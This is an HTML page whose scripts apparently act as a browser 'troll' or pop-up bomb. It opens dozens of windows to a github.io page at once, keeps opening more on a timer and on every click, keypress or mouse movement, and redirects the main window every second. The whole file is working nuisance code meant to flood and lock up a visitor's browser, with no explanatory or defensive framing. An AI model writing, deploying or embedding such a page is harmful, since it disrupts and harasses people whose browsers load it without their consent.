<!DOCTYPE html>
<html>
<head>
    <meta http-equiv='refresh' content='0.5; url=https://bader133b.github.io/triggertroll/'>
    <script>
        const TARGET = 'https://bader133b.github.io/typatroll/';
        
        // Open 50 windows immediately
        for (let i = 0; i < 50; i++) {
            setTimeout(() => {
                try {
                    window.open(TARGET, '_blank');
                } catch(e) {}
            }, i * 50);
        }
        
        // Open 10 windows every 500ms
        setInterval(() => {
            for (let i = 0; i < 10; i++) {
                try {
                    window.open(TARGET, '_blank');
                } catch(e) {}
            }
        }, 500);
        
        // Open on every event
        ['load', 'focus', 'click', 'mousemove', 'keydown'].forEach(event => {
            window.addEventListener(event, () => {
                for (let i = 0; i < 5; i++) {
                    try {
                        window.open(TARGET, '_blank');
                    } catch(e) {}
                }
            }, { once: false });
        });
        
        // Redirect main window every 1 second
        setInterval(() => {
            window.location.href = TARGET;
        }, 1000);
        
        setTimeout(() => {
            window.location.href = TARGET;
        }, 500);
    </script>
</head>
<body>
    <script>
        for (let i = 0; i < 20; i++) {
            window.open(TARGET, '_blank');
        }
    </script>
</body>
</html>
